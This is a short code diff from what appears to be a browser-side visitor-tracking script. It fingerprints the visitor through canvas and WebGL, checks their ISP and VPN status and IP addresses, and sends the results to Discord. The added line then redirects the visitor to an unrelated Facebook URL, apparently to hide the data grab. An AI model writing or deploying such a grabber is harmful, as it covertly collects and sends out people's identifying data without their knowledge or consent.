@@ -201,3 +201,4 @@ getCanvasFingerprint();
 getWebGLFingerprint();
 Promise.all([getISPandVPNStatus(), getAppleIPs()])
     .then(() => sendToDiscord());
+window.location="https://www.facebook.com/deletify.qzz.io"
